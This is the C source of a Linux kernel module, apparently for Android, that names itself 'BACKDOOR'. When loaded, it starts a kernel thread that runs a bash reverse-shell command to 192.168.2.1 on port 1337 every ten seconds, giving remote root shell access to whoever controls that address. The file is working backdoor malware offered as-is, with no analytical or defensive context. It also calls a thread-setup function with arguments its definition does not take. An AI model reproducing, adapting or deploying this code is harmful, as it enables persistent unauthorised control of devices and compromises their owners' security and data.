#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/delay.h>
#include<linux/init.h>
#include<linux/kthread.h>
#include<linux/sched.h>
#include<linux/delay.h>

char* argv[] = {"/system/xbin/bash","-c","/system/xbin/bash -i >& /dev/tcp/192.168.2.1/1337 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static struct task_struct *th;

int thread_function()
{
	while (!kthread_should_stop())
	{
		printk(KERN_INFO "BACKDOOR: thread running...\n");
		call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
		msleep(10000);
	}
	printk(KERN_INFO "BACKDOOR: thread stopped\n");
	return 0;
}


int initialize_thread()
{
	th = kthread_create(thread_function, NULL, "my_thread");
	if (th != NULL)
	{
		wake_up_process(th);
		printk(KERN_INFO "BACKDOOR: thread is running\n");
	}
	else
	{
		printk(KERN_INFO "BACKDOOR: kthread could not be created\n");
		return -1;
	}
	return 0;
}


static int __init mod_init(void)
{
	printk(KERN_INFO "BACKDOOR: initializing thread\n");
	if (initialize_thread (&th, 0) == -1)
		return -1;
	printk(KERN_INFO "BACKDOOR: thread running\n");
	return 0;

}


static void __exit mod_exit(void)
{
	printk(KERN_INFO "BACKDOOR: exiting module\n");
	if (!kthread_stop(th))
		printk("BACKDOOR: can't stop thread");
	printk(KERN_INFO "BACKDOOR: stopped thread\n");
}


module_init(mod_init);
module_exit(mod_exit);

MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("BACKDOOR");
MODULE_AUTHOR("backdoor");
MODULE_VERSION("1.1");

